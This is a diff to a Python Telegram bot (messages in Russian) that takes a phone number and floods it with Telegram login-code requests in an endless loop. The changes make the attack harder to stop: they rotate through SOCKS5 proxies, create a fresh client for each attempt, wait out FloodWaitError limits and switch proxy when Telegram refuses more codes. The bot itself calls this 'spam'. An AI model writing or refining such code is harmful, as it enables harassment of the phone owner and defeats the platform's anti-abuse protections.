@@ -2,6 +2,7 @@ import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 from telethon import TelegramClient
+from telethon.errors import FloodWaitError
 from telethon.network.connection import ConnectionTcpAbridged
 import socks
 
@@ -45,31 +46,40 @@ async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     async def spam():
         count = 0
         idx = 0
-        client = None
         while True:
+            proxy = PROXIES[idx % len(PROXIES)]
+            idx += 1
+            label = "локальный" if proxy is None else f"{proxy['ip']}:{proxy['port']}"
             try:
-                if client is None:
-                    proxy = PROXIES[idx]
-                    if proxy is None:
-                        client = TelegramClient(None, API_ID, API_HASH, connection=ConnectionTcpAbridged)
-                    else:
-                        proxy_tuple = (socks.SOCKS5, proxy['ip'], proxy['port'], proxy['user'], proxy['password'])
-                        client = TelegramClient(None, API_ID, API_HASH, proxy=proxy_tuple, connection=ConnectionTcpAbridged)
-                    await client.connect()
+                if proxy is None:
+                    client = TelegramClient(None, API_ID, API_HASH, connection=ConnectionTcpAbridged)
+                else:
+                    proxy_tuple = (socks.SOCKS5, proxy['ip'], proxy['port'], proxy['user'], proxy['password'])
+                    client = TelegramClient(None, API_ID, API_HASH, proxy=proxy_tuple, connection=ConnectionTcpAbridged)
+                await client.connect()
                 await client.send_code_request(phone)
                 count += 1
-                await context.bot.send_message(chat_id, f"Отправлен код #{count} на номер {phone}")
-                await asyncio.sleep(1)
+                await context.bot.send_message(chat_id, f"Отправлен код #{count} на номер {phone} через {label}")
+                await client.disconnect()
+                await asyncio.sleep(0.5)
+            except FloodWaitError as e:
+                await context.bot.send_message(chat_id, f"FloodWait {e.seconds} сек на {label}")
+                await asyncio.sleep(e.seconds)
             except Exception as e:
+                err = str(e)
+                if "all available options" in err or "ResendCodeRequest" in err:
+                    await context.bot.send_message(chat_id, f"⚠️ {label}: все методы использованы, переключение")
+                elif "Connection to Telegram failed" in err:
+                    await context.bot.send_message(chat_id, f"⚠️ {label}: коннект-фейл, переключение")
+                else:
+                    await context.bot.send_message(chat_id, f"⚠️ {label}: {err[:60]}, переключение")
                 if client:
                     await client.disconnect()
-                    client = None
-                idx = (idx + 1) % len(PROXIES)
-                await context.bot.send_message(chat_id, f"Ошибка: {e}. Переключение на следующий источник.")
+            await asyncio.sleep(0.1)
 
     task = asyncio.create_task(spam())
     spam_tasks[chat_id] = task
-    await update.message.reply_text("Запущен спам (локальный + 3 прокси). Для остановки /stop")
+    await update.message.reply_text("Запущен спам (новый клиент для каждой попытки). /stop для остановки.")
 
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
